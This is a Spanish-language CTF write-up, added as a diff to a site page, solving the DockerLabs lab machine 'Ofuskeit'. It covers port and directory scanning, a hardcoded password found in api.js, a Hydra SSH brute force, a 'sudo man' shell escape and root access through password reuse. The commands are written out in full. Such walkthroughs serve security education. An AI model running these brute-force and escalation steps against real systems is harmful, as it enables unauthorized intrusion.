@@ -1,0 +1,185 @@
+---
+title: Ofuskeit
+description: Resolución completa de la máquina virtual *Ofuskeit* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Ofuskeit**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web en el puerto 3000 que contiene un archivo `api.js` con credenciales hardcodeadas. Mediante un ataque de fuerza bruta con Hydra, se identifica un usuario válido para SSH y se accede al sistema como `admin`.
+Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `man` como el usuario `balulito`, facilitando el movimiento lateral. Finalmente, se prueba la reutilización de credenciales y se descubre que la contraseña de `admin` también funciona para `root`, completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Ofuskeit',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Media',
+    Fecha: '01/06/2025',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Ofuskeit.zip
+sudo bash auto_deploy.sh Ofuskeit.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Ofuskeit/{content,exploits,nmap,scripts}
+cd Ofuskeit
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+* **3000/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1783196627/Ports_b46g2g.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80,3000 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios en el puerto 3000:
+
+```bash
+feroxbuster -u http://172.17.0.2:3000/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,js,txt,html
+```
+
+![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1783196627/Feroxbuster_ljd13o.png)
+
+Se identifica el archivo `api.js`.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Análisis de api.js
+
+El archivo `api.js` contiene credenciales hardcodeadas:
+
+![API](https://res.cloudinary.com/dewqswzke/image/upload/v1783196627/Api_zlknio.png)
+
+Contraseña: `chocolate123`
+
+### 2.2 Fuerza bruta SSH
+
+```bash
+hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p chocolate123 ssh://172.17.0.2 -I
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1783196627/Hydra_fdvl4e.png)
+
+### 2.3 Acceso SSH
+
+```bash
+ssh admin@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1783196629/Ssh_bph8gf.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De admin → balulito
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1783196629/Sudo-lAdmin_z2g8a9.png)
+
+Se puede ejecutar `man` como `balulito`:
+
+```bash
+sudo -u balulito man man
+!/bin/bash
+```
+
+![Balulito](https://res.cloudinary.com/dewqswzke/image/upload/v1783196627/Balulito_znbjjt.png)
+
+### 3.2 De balulito → root
+
+Se prueba la reutilización de credenciales y se descubre que la contraseña de `admin` también funciona para `root`:
+
+```bash
+su root
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1783196629/Root_gvyy89.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Credenciales hardcodeadas en archivo JavaScript",
+      severity: "Crítica",
+      impact: "Acceso SSH mediante fuerza bruta"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en man",
+      severity: "Alta",
+      impact: "Movimiento lateral a balulito"
+    },
+    {
+      vulnerability: "Reutilización de contraseñas entre usuarios",
+      severity: "Crítica",
+      impact: "Escalada directa de privilegios a root"
+    }
+  ]}
+/>
